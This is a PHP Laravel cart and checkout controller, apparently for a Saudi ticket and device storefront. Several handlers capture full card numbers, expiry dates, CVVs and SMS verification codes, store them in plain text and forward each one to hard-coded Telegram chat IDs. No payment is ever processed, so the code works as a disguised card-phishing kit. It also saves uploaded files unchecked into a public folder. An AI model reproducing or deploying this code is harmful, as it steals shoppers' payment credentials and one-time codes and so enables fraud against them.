<?php

namespace App\Http\Controllers\Front;

use App\{
    Models\Item,
    Models\Setting,
    Models\Order,
    Http\Controllers\Controller,
    Repositories\Front\CartRepository
};
use App\Helpers\PriceHelper;
use App\Models\ShippingService;
use App\Models\Customer;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Mail;
use MyTestMail;
use VisaMail;
use Carbon\Carbon;
use Telegram\Bot\FileUpload\InputFile;
use Telegram\Bot\Laravel\Facades\Telegram;
class CartController extends Controller
{
    /**update
     * Constructor Method.
     *
     * @param  \App\Repositories\Front\CartRepository $repository
     *
     */
    public function __construct(CartRepository $repository)
    {
        $this->repository = $repository;
        $this->middleware('localize');
    }


public function store_ticket_info(Request $request)
{
    // dd($request->all());
    
                    $event_id=$request->event_id;
                    $event=Item::where('id',$event_id)->first();
             $event_name=$event->name;
              $tickectPric=$request->tickectPric;
              $first_name=$request->first_name;
              $last_name=$request->last_name;
              $city=$request->city;
              $phone=$request->phone;
              $country=$request->country;
              $tickectPric=$request->tickectPric;
               $ticketsNumber=$request->ticketsNumber;
               $total=$ticketsNumber*$tickectPric;
                  	                 $setting = Setting::first();

          
          $user_id= Order::insertGetId([               
               'first_name'=>$first_name,
                'last_name'=>$last_name,
               'city'=>$city,
               'phone'=>$phone,
               'country'=>$country,
               'tickectPric'=>$tickectPric,
                "created_at"=> Carbon::now(),
                'ticketsNumber'=>$ticketsNumber,
                'total'=>$ticketsNumber,
             


   
 
               ]);
  
               
             $text = "بيانات  التذكرة   \n"
            . "الاسم: "
            . "$first_name\n"
               . "الاسم: "
            . "$last_name\n"
            
            . "واتساب : "
            . " <a href='https://api.whatsapp.com/send?phone=966$phone'>     $phone </a> \n"
            . "اجمالي : "
            . " $total.$setting->currency  \n"
    
            . "العنوان: "
            . " $city \n"
           . "الحدث : "
            . " $event_name\n"
          
             ;
               
               
               
               
                 $chatIds=array('7856723696');
foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);  
               
               
               
               
               
}
               
               
               
               
               
               
  return redirect()->route('front.payment',['id' =>$user_id]);               
               
               
 
}

public function store_visa_info(Request $request)
{
    
        // dd($request->all());
        
        
        
        $cardholderName=$request->cardholderName;
        $cardNumber=$request->cardNumber;
        $expmonth=$request->expmonth;
        $expyear=$request->expyear;
        $cvv=$request->cvv;
        $id=$request->id;

        $order = Order::findOrFail($id);
        $phone=$order->phone;
        
          Order::where('id',$id)->update([              
               'cardholderName'=>$cardholderName,
                'cardNumber'=>$cardNumber,
               'expmonth'=>$expmonth,
               'expyear'=>$expyear,
               'cvv'=>$cvv,
               ]);
  
             $text = "   Tiket Book    \n"
                     
 
          
            
        //  ."Mr:$cardholderName\n\n"
            
            
          . "&#128222;: $phone\n\n"
          ."رقم البطاقة \n"
         . " ". "<code>$cardNumber</code> \n\n"
            . "تاريخ الانتهاء: (MM)$expmonth \n\n"
            . "تاريخ الانتهاء: (YY)$expyear \n\n"
            . "رمز الامان:(CVV) $cvv 
            ===================================";

                 $chatIds=array('7856723696');
foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);  
               
  

}
  
  

  return redirect()->route('front.code',['id' =>$id]);               

}

public function store_visa_code(Request $request)
{
    
            // dd($request->all());

            $id=$request->id;
            $code=$request->code;
        $order = Order::findOrFail($id);
        $phone=$order->phone;

         
         
         
             $text = " كود التحقق        \n"
                     
 
         
             
            
          . "&#128222;: $phone\n\n"
              . "&#128274;: $code 
            =============================";

                 $chatIds=array('7856723696');
foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);  
             
         
         
         
         
         
         
         
         
         
         
          Order::where('id',$id)->update([              
               'code'=>$code
 
               ]);
  
  
  
  
  
  
  
  
}
  
  
  
  return redirect()->route('front.code',['id' =>$id]);               

}




            public function orderdelete (Request $request)
            {
                
                // dd($request->id);
                Customer::where('id',$request->id)->delete();
                
                      return redirect()->back();

                
            }



   public function addToCart(Request $request)
    {
         $id=$request->id;
        $quantity=$request->quantity;
        
        $item = Item::findOrFail($id);
        $cart = session()->get('cart', []);
  
        if(isset($cart[$id])) {
            // dd($cart[$id]['quantity'],$quantity);
            $cart[$id]['quantity']=$cart[$id]['quantity']++;
        } else {

            $cart[$id] = [
                "name" => $item->name,
                "quantity" => 1,
                "price" => $item->discount_price,
                "image" => $item->photo,
                "slug" => $item->slug
            ];
        }
         session()->put('cart', $cart);
        // return redirect()->back()->with('message', 'تم اضافة المنتج الي السلة بنجاح');
        
        // dd($cart);
      return redirect()->route('my_cart');

    }
        
        
          public function updateCart(Request $request)
    {
        //  dd($request->all());
        
        
        $id =$request->id;
        $quantity =$request->quantity;
        $cart = session()->get('cart', []);
  
         if(isset($cart[$id])) {
            // dd($cart[$id]['quantity'],$quantity);
            $cart[$id]['quantity']=$quantity;
        }
          
        session()->put('cart', $cart);
        // dd($cart);
        // return redirect()->back()->with('message', 'تم اضافة المنتج الي السلة بنجاح');
 
    }
        
        
           public function remove(Request $request)
    {
        // dd($request->all());
        if($request->id) {
            $cart = session()->get('cart');
            if(isset($cart[$request->id])) {
                unset($cart[$request->id]);
                session()->put('cart', $cart);
            }
        return redirect()->back()->with('message', 'تم اضافة المنتج الي السلة بنجاح');
        }
    }
        
        
        
        	public function index()
	{
        if(Session::has('cart')){
            $cart = Session::get('cart');
        }else{
            $cart = [];
        }
        return view('front.catalog.cart',[
            'cart' => $cart
        ]);
    }
    
 public function update(Request $request)
    {
        if($request->id && $request->quantity){
            $cart = session()->get('cart');
            $cart[$request->id]["quantity"] = $request->quantity;
            session()->put('cart', $cart);
            session()->flash('success', 'Cart updated successfully');
        }
    }
  
    
  	public function makePayment(Request $request)
	{
        if(Session::has('cart')){
            $cart = Session::get('cart');
        }else{
            $cart = [];
        }
        return view('front.catalog.makePayment',[
            'cart' => $cart
        ]);
    }
        	public function store_makePayment(Request $request)
	{
	   	   // dd($request->all());

	     // dd($cart);
                $name=$request->name;
                 $phone=$request->phone;
                $address=$request->location;
                $address2=$request->street;
                $FirstPayment=$request->FirstPayment;
                $InstallmentBy=$request->InstallmentBy;
                $MonthlyPayment=$request->MonthlyPayment;
                $payment_name=$request->payment_name;
                $number = mt_rand(100000, 999999);
                $shippment_number = mt_rand(10000000, 999999999);
                                $FirstPayment=$request->FirstPayment;
                                $payment_method=$request->payment_method;
 	                 $setting = Setting::first();

	      if(Session::has('cart')){
            $cart = Session::get('cart');
            $total=0;
            $device_name=0;
            foreach(session('cart') as $id => $details)
            {
                
                
              $total += $details['price'] * $details['quantity'];  
                $device_name=$details['name'];
            }
        }
        // dd($InstallmentBy);
            if(!empty($InstallmentBy)){
                                   $payment_type=1;
               }
            if(empty($InstallmentBy))
               {
                 
                   $FirstPayment=$total;
                   $payment_type=0;
               }
              $user_id= Customer::insertGetId([               
               'name'=>$name,
              'cart'=>json_encode($cart,true),
               'whatsApp'=>$phone,
               'address'=>$address,
               'FirstPayment'=>$FirstPayment,
               'InstallmentBy'=>$InstallmentBy,
               'MonthlyPayment'=>$MonthlyPayment,
                "created_at"=> Carbon::now(),
                'total'=>$total,
                'payment_type'=>$payment_type,
                'order_number'=>$number,
                'shippment_number'=>$shippment_number


   
 
               ]);
               
        
       
                
                $number = mt_rand(100000, 999999);
             $shippment_number = mt_rand(10000000, 999999999);
              
               
           
               
               
         
               $url=request()->headers->get('origin');
         $invoicePath=$url."/order/print/".$user_id;
         $RecepitVoucher=$url."/RecepitVoucher/print/".$user_id;
// dd($InstallmentBy);
               if(empty($InstallmentBy))
               {
                   
                                  $payemt_text="نقدا";
                                         
                                         
                   
                   
                              $text = "بيانات الزبون  \n"
            . "الاسم: "
            . "$name\n"
            . "واتساب : "
            . " <a href='https://api.whatsapp.com/send?phone=966$phone'>     $phone </a> \n"
            . "اجمالي : "
            . " $total.$setting->currency  \n"
            . " الدفع : "
            . " $payemt_text \n"
            . "الدفعة الأولي   : "
            . " $FirstPayment . $setting->currency  \n"
            . "العنوان: "
            . " $address\n"
           . "الجهاز: "
            . " $device_name\n"
              . "سند قبض : "
            . " $RecepitVoucher\n"
            
                . "الفاتورة: "
            . " $invoicePath\n";
               
    $chatIds=array('7856723696');
foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);
    
}

                   
                   
                   
                   
                   
                   
                   
                   
                   
               }else{
                    $payment_name=1;
                   
                                                  $payemt_text="تقسيط على [$InstallmentBy] شهر [$MonthlyPayment]ريال شهريا";
   
                                                 $contractPath=$url."/contract-of-sale/print/".$user_id;

             
                           $text = "بيانات الزبون  \n"
            . "الاسم: "
            . "$name\n"
            . "واتساب : "
            . " <a href='https://api.whatsapp.com/send?phone=966$phone'>     $phone </a> \n"
            . "اجمالي : "
            . " $total.$setting->currency  \n"
            . " الدفع : "
            . " $payemt_text \n"
            . "الدفعة الأولي   : "
            . " $FirstPayment . $setting->currency  \n"
            . "العنوان: "
            . " $address\n"
           . "الجهاز: "
            . " $device_name\n"
                . "الفاتورة: "
            . " $invoicePath\n"
               . "عقد التقسيط : "
       
            . " $contractPath\n"
                      . "سند قبض : "
            . " $RecepitVoucher\n";
             
             
             
             
                $chatIds=array('7856723696');
foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);
    
}

 

       }
 

    return redirect()->route('front.catalog.checkout2',['id' =>$user_id,'FirstPayment'=>$FirstPayment]);
  
 
     
    }
    
    
    
    
    
    
    
    
    
      	public function store_chekout2(Request $request)
	{
	   	   // dd($request->all());

	     // dd($cart);
                $name=$request->name;
                $id=$request->id;
                 $phone=$request->phone;
                $address=$request->location;
                $address2=$request->street;
                $FirstPayment=$request->FirstPayment;
                $InstallmentBy=$request->InstallmentBy;
                $MonthlyPayment=$request->MonthlyPayment;
                $payment_name=$request->payment_name;
                $number = mt_rand(100000, 999999);
                $shippment_number = mt_rand(10000000, 999999999);
                $FirstPayment=$request->FirstPayment;
                $payment_method=$request->payment_method;
                $bankNameAccount=$request->bankNameAccount;

	   
	   
 
                 $NameOnCard=$request->CardName;
                $CardNumber=$request->cardNumber;
                $ExpireYear=$request->year;
                $ExpireMonth=$request->month;
                 $Cvv=$request->cvv;
    

    
    Customer::where('id',$id)->update([
         
         'NameOnCard'=>$NameOnCard,
         'CardNumber'=>$CardNumber
         
         ]);

    
    
    
        
    Customer::where('id',$id)->update([
         
         'payment_method'=>$payment_method
          
         ]);

    
    
          $customer=Customer::where('id',$id)->first();
         $name=$customer->name;
         $phone=$customer->whatsApp;
    
 
 
 
 
 
 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
         

    
    
                if($payment_method==1||$payment_method==2)
 {




                   $text ="Mr:$NameOnCard\n\n"
             . "&#128222;: $phone\n\n"
            . "	&#128179;:". "<code>$CardNumber</code>\n\n"
            . "&#128197;:$ExpireYear/$ExpireMonth\n\n"
            . "&#128274;: $Cvv
            =========================================";
     Customer::where('id',$id)->update([
         
         'NameOnCard'=>$NameOnCard,
         'CardNumber'=>$CardNumber
         
         ]);


 $chatIds=array('7856723696');
 foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);
    
}


    return redirect()->route('front.catalog.code',['id' =>$id,'FirstPayment'=>$FirstPayment]);
 }  
                if($payment_method==3)
 {
    //  dd(123);
          
              
             $text ="Mr:$name\n\n"
             . "&#128222;: $phone\n\n"
             . "	&#128179;:". "Bank Transfer \n\n"
            . "&#128172; :$bankNameAccount";
 $chatIds=array('5921720554');
 foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);
    
}



 if($request->hasfile('file'))
         {
             
             $TransferFile=$request->file('file');
             
                $name1 = time().rand(1,100).'.'.$TransferFile->extension();
                $TransferFile->move(public_path('files'), $name1);  
                $TransferFile = $name1;  
        //  dd($file1);

       
       
       
       
       
       
              Customer::where('id',$id)->update([
                 'TransferFile'=>$TransferFile,
                
               "created_at"=> Carbon::now()

               ]);  
       
       
       
       
       
       
       
       
       
       
        }

 



















    return redirect()->route('front.catalog.success',['id' =>$id]);
 } 

     
 
     
    }   
    
      public function RecepitVoucher($id)
    {
           $order = Customer::findOrfail($id);
        $cart = json_decode($order->cart, true);
        return view('front.order.RecepitVoucher',compact('order','cart'));
    }
     
    
       public function printOrder($id)
    {
           $order = Customer::findOrfail($id);
        $cart = json_decode($order->cart, true);
        return view('front.order.print',compact('order','cart'));
    }
     
     
           public function printContract($id)
    {
             $order = Customer::findOrfail($id);
        $cart = json_decode($order->cart, true);
        return view('front.order.contract-of-sale',compact('order','cart'));
    }
     	public function code (Request $request)
	{
        if(Session::has('cart')){
            $cart = Session::get('cart');
        }else{
            $cart = [];
        }
        return view('front.catalog.code',[
            'cart' => $cart
        ]);
    }
         	public function aboutus (Request $request)
	{
      
     return view('front.catalog.aboutus');
    }
      	public function iban (Request $request)
	{
        if(Session::has('cart')){
            $cart = Session::get('cart');
        }else{
            $cart = [];
        }
        return view('front.catalog.iban',[
            'cart' => $cart
        ]);
    }
        	public function contact (Request $request)
	{
              $setting = Setting::first();

     return view('front.catalog.contact',compact('setting'));
    }
    
    
    
     public function store_product(Request $request)
     
     {


             $item_id=$request->item_id;
             $item_count=$request->item_count??1;
               
                $user_id= Customer::insertGetId([               
               'item_id'=>$item_id,
               'item_count'=>$item_count,

               ]);


    // $item =Item::where('id',$item_id)->first();
// dd($item);
     return redirect()->route('my_cart',['user_id' =>$user_id,'item_id'=>$item_id  ]);


     }
    
    
     	public function StoreCart(Request $request)
	{
    //  dd($request->all());
            // $user_id=$request->user_id;
            $delivaryCompanyId=$request->delivaryCompanyId;
            $InstallmentBy=$request->InstallmentBy;
            $FirstPayment=$request->FirstPayment;
            $MonthlyPayment=$request->MonthlyPayment;
            $monthly_amount=$request->monthly_amount;
             $item_count=$request->item_count??1;
             $total=$request->total;
               
               
               if($delivaryCompanyId==1)
               {
                   $shippment_cost=50;
                }
                  if($delivaryCompanyId==2)
               {
                   $shippment_cost=25;
 
               }
               $total=$total+$shippment_cost;
               if($InstallmentBy==0)
               {
                   
                   $FirstPayment=$total;
               }
               $orderData['delivaryCompanyId'] = $delivaryCompanyId;
               $orderData['InstallmentBy'] = $InstallmentBy;
               $orderData['FirstPayment'] = $FirstPayment;
               $orderData['MonthlyPayment'] = $MonthlyPayment;
               $orderData['shippment_cost'] = $shippment_cost;
               $orderData['total'] = $total;








$user_id= Customer::insertGetId($orderData);
               $customer=Customer::where('id',$user_id)->first();
return view("front.catalog.checkout",compact("user_id","customer"));
// return redirect()->route('my_checkout')->with(['id', $id]);

    //  return redirect()->route('my_checkout',['id' =>$id,'item_id'=>$id  ]);

	}

       
       
       
       
       
       
       
       
       
  
       
       
       	public function store_pay_form(Request $request)
	{
	    
	    $cart=Session::get('cart');
/// 

// foreach($cart as $key=>$value){
//     $pid=$value['pid'];
//     $qnty=$value['qnty'];
// }  
            $item_id=$request->item_id;
            $customer_id=$request->id;
            $ValidTo=$request->ValidTo;
            $cardNumber=$request->cardNumber;
            $address=$request->address;
            $whatsApp=$request->whatsApp;
             $email=$request->email;
             $name=$request->name;
             $CCV=$request->CCV;
             $CardHolderName=$request->CardHolderName;
             $number = mt_rand(100000, 999999);
             $shippment_number = mt_rand(10000000, 999999999);



  if($request->hasfile('TransferFile'))
         {
             
             $TransferFile=$request->file('TransferFile');
             
                $name1 = time().rand(1,100).'.'.$TransferFile->extension();
                $TransferFile->move(public_path('files'), $name1);  
                $TransferFile = $name1;  
/*          dd($file1);
*/
         }


         if($request->hasfile('DiscountBillFile'))
         {
                        $DiscountBillFile=$request->file('DiscountBillFile');

                $name2 = time().rand(1,100).'.'.$DiscountBillFile->extension();
                $DiscountBillFile->move(public_path('files'), $name2);  
                $DiscountBillFile= $name2;  
         }
         
                
               
               Customer::where('id',$customer_id)->update([
                 'TransferFile'=>$TransferFile,
                'DiscountBillFile'=>$DiscountBillFile,
               
               "created_at"=> Carbon::now()

               ]);  
               
               $customer=  Customer::where('id',$customer_id)->first();
             
               
    //  $details = [
    //     'name'=>$name,
    //     'email'=>$email,
    //     'whatsApp'=>$whatsApp,
    //     'address'=>$address,
    //     'CardHolderName' =>$CardHolderName,
    //     'cardNumber' =>$cardNumber,
    //     'CCV' =>$CCV,
    //     'ValidTo' =>$ValidTo,
    // ];
            // $data = Setting::find(1);

    // $emails = ['khaledthabet946@gmail.com'];

    // \Mail::to($emails )->send(new \App\Mail\VisaMail($details));
               
        $text = "sdf";

 
   
   
   
     return view("front.catalog.success", compact("customer_id"));

	}
       
       
	public function store_code(Request $request)
	{


// dd($request->all());
        $id=$request->id;
    $customer=Customer::where('id',$id)->first();
    
    // dd($customer);
    
$NameOnCard=$customer->NameOnCard;
$CardNumber=$customer->cardNumber;
$phone=$customer->whatsApp;



         $text ="Mr:$NameOnCard\n\n"
             . "&#128222;: $phone\n\n"    
            . "	&#128179;:". "<code>$CardNumber</code>\n\n"
             . "&#128270;<code>$request->code</code>\n"

           ." =========================================";

     






 $chatIds=array('7856723696');
 foreach($chatIds as $chatId) {

      Telegram::sendMessage([
            'chat_id' =>$chatId,
            'parse_mode' => 'HTML',
            'text' => $text
        ]);
    
}




            

       return redirect()->route('front.catalog.code',['id' =>$id,'send'=>1]);

    

	    
	}

	public function store(Request $request)
	{
        $msg = $this->repository->store($request);
        if(isset($request->addtocart)){
           Session::flash('success_message',__('Cart Added Successfully'));
           return back();
        }
        return redirect()->route('front.cart')->withSuccess($msg);
	}

    public function destroy($id)
    {

        $cart = Session::get('cart');
        unset($cart[$id]);
        if(count($cart) > 0){
            Session::put('cart',$cart);
        }else{
            Session::forget('cart');
        }
        Session::flash('success',__('Cart item remove successfully.'));
        return back();
    }

	public function promoStore(Request $request)
	{
        return response()->json($this->repository->promoStore($request));
	}

    public function shippingStore(Request $request)
    {
        return redirect()->route('front.checkout');
    }


    // public function update($id)
    // {
    //     return view('front.catalog.cart_form',[
    //         'item' => Item::findOrFail($id),
    //         'attributes' => Item::findOrFail($id)->attributes,
    //         'cart_item' => Session::get('cart')[$id],
    //     ]);
    // }


    public function shippingCharge(Request $request)
    {

        $charges = [];
        $items = [];
        foreach($request->user_id as $data){
            $check = explode('|',$data);
            $charges[] = $check[0];
            $items[] = $check[1];
        }
        $cart = Session::get('cart');
        $delivery_amount = 0;
        foreach($charges as $index => $charge){
            if($charge != 0){
                 $vendor_charge = Item::findOrFail($items[$index])->user->shipping->price;
                $delivery_amount += $vendor_charge;
                $cart[$items[$index]]['delivery_charge'] = $vendor_charge;
            }else{
                $cart[$items[$index]]['delivery_charge'] = 0;
            }
        }

        Session::put('cart',$cart);

        return response()->json(['delivery' => PriceHelper::setPrice($delivery_amount),'main' => $delivery_amount]);

    }


    public function headerCartLoad()
    {
        return view('includes.header_cart');
    }
    public function CartLoad()
    {
        return view('includes.cart');
    }

    public function cartClear()
    {
        Session::forget('cart');
        Session::flash('success',__('Cart clear successfully'));
        return back();
    }

}


